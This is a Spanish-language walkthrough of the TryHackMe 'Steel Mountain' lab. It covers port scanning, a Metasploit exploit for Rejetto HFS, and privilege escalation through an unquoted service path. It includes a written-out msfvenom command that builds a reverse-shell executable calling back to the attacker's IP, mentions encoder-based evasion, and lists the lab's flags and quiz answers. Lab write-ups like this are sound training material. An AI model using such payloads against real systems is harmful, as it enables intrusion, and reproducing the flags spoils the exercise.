# Máquina Steel Mountain

Dificultad --> Medio-Dificil 

Instrucciones --> **Para poder resolver esta máquina tienes que registrarte en la página de TryHackMe y buscarla por el nombre de Steel Mountain**

'

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

'

## 1.Reconocmiento

Escaneando puertos y sus versiones utilizando el comando de nmap con diferentes parámetros


![image](https://github.com/user-attachments/assets/1ad02628-b792-4046-8c68-64e0cdf76c14)


![image](https://github.com/user-attachments/assets/32314d7a-703c-480a-b5a8-a60894c497b1)


Buscamos sus versiones


![image](https://github.com/user-attachments/assets/8d94a0b4-aba3-4d7d-b5b3-1d8631e90ebb)


Convertimos el archivo que se nos genero para poder visualizarlo mejor con el siguiente comando **--> xsltproc pc.xml -o pc.html <--** y luego lo abrimos con el navegador


![image](https://github.com/user-attachments/assets/20517a9e-b2c8-41ce-815a-f715c1af3237)


![image](https://github.com/user-attachments/assets/53650fa0-093c-4d9c-92fa-c1e813c0c5a6)



### Resumen de la Información Obtenida

|IP             | Sistema OPerativo            | Puertos/Servicios                            | 
|:------------: |:----------------------------:| :-------------------------------------------:| 
| 10.10.89.218  |Windows Server 2012 x64-based | 80  http Microsoft-IIS/8.5                   |
|               |                              | 135 msrpc                                    |
|               |                              | 139 netbios-ssn                              |
|               |                              | 445 microsoft-ds/Windows Server 2008 R2-2012 |
|               |                              | 3389 ms-wbt-server                           |
|               |                              | 5985 http                                    |
|               |                              | 8080 http/file server 2.3                    |


## 2. Análisis de Vulnerabilidades / Debilidades

Realizamos un Fuzzing


![image](https://github.com/user-attachments/assets/cd6951ad-7dd5-4523-a4e0-4566dbd5a736)


En el reconocimiento encontramos que tenemos el puerto 8080 abierto así que procedemos abrir la ip con ese puerto


![image](https://github.com/user-attachments/assets/1fd1e9b8-5552-48fc-9121-0c68c9cf6ceb)


Como podemos observar en la sección de server information nos sale que es un Http File Server 2.3 en forma de un link si lo abrimos nos dirige a una pagina llamada **rejetto**


![image](https://github.com/user-attachments/assets/9145d40b-8509-4c4c-85bb-d20471c743a4)


Buscamos vulnerabilidad a rejetto


![image](https://github.com/user-attachments/assets/958df400-b4d3-4a2c-b4c2-3ee47721b7f9)



## 3. Explotación


Abrimos Metasploit con el comando -->**msfconsole**<-- y buscamos la vulnerabilidad


![image](https://github.com/user-attachments/assets/8e7da341-5721-44f1-8e8b-bb31567b1284)


Modificamos los parámetros


![image](https://github.com/user-attachments/assets/14159ff1-52cc-4193-81ce-d84837931283)


![image](https://github.com/user-attachments/assets/a560af1a-a4d9-4ac1-90cc-03146888ce82)


Corremos el exploit y una ves obtenida una sesión de meterpreter ejecutamos el comando --> **shell**



![image](https://github.com/user-attachments/assets/a23d7d9f-f087-46fb-8cba-79acb7f00d90)


Encontramos el contenido deel archivo user.txt 🚩


![image](https://github.com/user-attachments/assets/b7401654-7e69-463b-b4aa-06a9389b7b2d)


## 4. Escalación de privilegios

Ejecutamos el siguiente comando con msfvenom para realizar una Shell reverse

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.86.141 LPORT=4443 -f exe -o Advanced.exe


![image](https://github.com/user-attachments/assets/251064ae-618a-44b9-a822-64cfa6da47df)


Montamos nuestra maquina como servidor


![image](https://github.com/user-attachments/assets/0e45fa38-77f2-4ecd-82e9-53a28bde7a8e)


Descargamos nuestro archivo y detenemos el servicio AdvancedSystemCareService9


![image](https://github.com/user-attachments/assets/c64351fb-5cb0-4404-8eb7-5ac77f839798)


Activamos nuestro netcat


![image](https://github.com/user-attachments/assets/8fba1783-c185-4749-a550-b4a7bc0f7de2)


Activamos el servicio AdvancedSystemCareService9


![image](https://github.com/user-attachments/assets/7a538864-39ea-4437-bdd8-da3997fdbcdb)


Una vez activado el servicio de AdvancedSystemCareService9 vemos que en nuestra maquina donde nos pusimos modo escucha se nos conecta, ahora procedemos a buscar el archivo root.txt


![image](https://github.com/user-attachments/assets/dc1f8056-4622-4951-b3dc-639efe049886)


![image](https://github.com/user-attachments/assets/494786e3-582d-4c64-b6f4-3be8a04c83b1)



## 5.Banderas 🏁

|user.txt | b04763b6fcf51fcd7c13abc7db4fd365 |
|:-------:|:--------------------------------:|
|root.txt | 9af5f314f57607c00fd09803a587db80 |



## 6.Extra 🚨

Acá las respuesta del cuestionario de TryHackMe 

•¿Quién es la empleada del mes?
Bill Harper

•Escanee la máquina con nmap. ¿En qué otro puerto se ejecuta un servidor web?
8080

•Eche un vistazo al otro servidor web. ¿Qué servidor de archivos se está ejecutando?
Rejetto http file server

•¿Cuál es el número CVE para explotar este servidor de archivos?
2014-6287

•Utilice Metasploit para obtener un shell inicial. ¿Qué es la bandera de usuario?
b04763b6fcf51fcd7c13abc7db4fd365

•Preste mucha atención a la opción CanRestart que está configurada como verdadera. ¿Cuál es el nombre del servicio que aparece como una vulnerabilidad de ruta de servicio sin comillas?
AdvancedSystemCareService9

•¿Qué es la bandera root?
9af5f314f57607c00fd09803a587db80

•El formato es el comando "powershell -c" aquí
powershell -c Get-Service


### Entrando a la máquina destino utilizando msfvenom con shikata ga nai

Creamos el archivo Advanced2.exe con los siguientes parámetro: 
 
--> -a para indicar la arquitectura del sistema operativo 
 
--> -p para indicar el payload
 
--> lhost que seria la ip de nuestra máquina
 
--> lport que sería el puerto por donde vamos a escuchar
 
--> -e para indicar el encoder a utilizar
 
--> -i para indicar el numero de interacciones que va tener
 
--> -f para indicar que será un ejecutable
 
--> – o para indicar el parámetro de salida


![image](https://github.com/user-attachments/assets/5cf72075-9e1d-488d-8728-4440291af6ea)


Descargamos el archivo en la máquina destino


![image](https://github.com/user-attachments/assets/742e0b90-94e0-44df-b237-c55abe8dd0af)


Activamos el netcat en el puerto 4443


![image](https://github.com/user-attachments/assets/83783d14-30a0-4aac-b257-5ea5dda7e416)


Ejecutamos

![image](https://github.com/user-attachments/assets/222224d3-975d-40a3-a1dc-02a691b20465)


Logramos entrar


![image](https://github.com/user-attachments/assets/6327b2e2-d5d0-4b20-a8eb-a018dc5b7c19)



### Aplicación de la Herramienta PowerUp.ps1

Descargamos desde nuestra máquina como servidor nuestro archivo PowerUp en la máquina destino


![image](https://github.com/user-attachments/assets/4fe2649c-723f-4327-badf-74088685acbc)


Regresamos a meterprete y ejecutamos load powershell


![image](https://github.com/user-attachments/assets/5c901326-68a3-4b17-b0c7-b513d1b9e87f)


Ejecutamos los siguientes comando e invocamos la herramienta



![image](https://github.com/user-attachments/assets/d0e78e49-e60e-4ccd-88ab-378ab6d820b2)



Mediante PowerUp se comprueban servicios vulnerables, aplicaciones susceptibles a DLL Hijacking, configuración del registro y otras comprobaciones.


![image](https://github.com/user-attachments/assets/2e4a24ae-8055-4983-a13d-2ab4de04cd0f)


![image](https://github.com/user-attachments/assets/7d0dacf0-449b-423c-8c43-3cffd76999a7)



